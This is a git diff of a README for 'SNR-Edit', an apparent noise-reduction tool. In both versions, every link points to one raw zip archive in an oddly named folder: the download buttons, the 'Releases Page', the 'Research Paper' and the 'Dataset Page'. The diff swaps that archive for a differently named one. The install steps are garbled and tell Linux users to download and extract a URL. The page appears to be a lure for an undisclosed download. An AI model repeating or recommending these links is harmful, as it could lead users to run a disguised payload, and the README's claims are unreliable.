@@ -1,7 +1,7 @@
 # 🎉 SNR-Edit - Simplify Noise Reduction Efforts
 
 <div align="center">
-  <a href="https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip" style="display: inline-block; padding: 10px 20px; font-size: 20px; color: white; background-color: #4CAF50; text-decoration: none; border-radius: 5px;">Download SNR-Edit</a>
+  <a href="https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip" style="display: inline-block; padding: 10px 20px; font-size: 20px; color: white; background-color: #4CAF50; text-decoration: none; border-radius: 5px;">Download SNR-Edit</a>
 </div>
 
 <div>
@@ -30,14 +30,14 @@ SNR-Edit helps you easily reduce noise in your audio or video files. This guide 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip) to download the latest version of SNR-Edit.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip) to download the latest version of SNR-Edit.
    
 2. On the Releases page, you will see a list of available versions. Click on the version you want to download.
 
 3. Choose the appropriate file for your operating system:
    - For Windows, download the file ending in `.exe`.
    - For macOS, download the file ending in `.dmg`.
-   - For Linux, download the file ending in `https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip`.
+   - For Linux, download the file ending in `https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip`.
 
 4. After the download completes, locate the downloaded file on your computer.
 
@@ -50,7 +50,7 @@ SNR-Edit helps you easily reduce noise in your audio or video files. This guide 
 - Drag the SNR-Edit application into your Applications folder.
 
 ### For Linux Users
-- Extract the `https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip` file.
+- Extract the `https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip` file.
 - Open a terminal, navigate to the extracted folder, and use `./SNR-Edit` to run the application.
 
 ## 🎬 What SNR-Edit Can Do
@@ -82,8 +82,8 @@ If you encounter issues while installing or running SNR-Edit, try the following:
 
 ## 🔗 Additional Resources
 
-- Read our [Research Paper](https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip) for in-depth information about SNR-Edit and its algorithms.
-- Explore the [Dataset Page](https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip) to access related datasets for training and testing.
+- Read our [Research Paper](https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip) for in-depth information about SNR-Edit and its algorithms.
+- Explore the [Dataset Page](https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip) to access related datasets for training and testing.
 
 ## 💬 Community Support
 
@@ -91,12 +91,12 @@ Join our community for help and feedback. You can connect with other users throu
 
 ## 📅 Updates
 
-Make sure to check back on the [Releases Page](https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip) for updates and new features added to SNR-Edit. We are continuously working to enhance your experience.
+Make sure to check back on the [Releases Page](https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip) for updates and new features added to SNR-Edit. We are continuously working to enhance your experience.
 
 ## 📃 License
 
 SNR-Edit is licensed under the MIT License. You can freely use, modify, and distribute this software as long as you preserve the original license.
 
 <div align="center">
-  <a href="https://github.com/bahricrypto/SNR-Edit/raw/refs/heads/main/hobbledehoyhood/SN-Edit-v3.9.zip" style="display: inline-block; padding: 10px 20px; font-size: 20px; color: white; background-color: #4CAF50; text-decoration: none; border-radius: 5px;">Download SNR-Edit</a>
+  <a href="https://raw.githubusercontent.com/bahricrypto/SNR-Edit/main/hobbledehoyhood/Edit-SN-holoptychian.zip" style="display: inline-block; padding: 10px 20px; font-size: 20px; color: white; background-color: #4CAF50; text-decoration: none; border-radius: 5px;">Download SNR-Edit</a>
 </div>
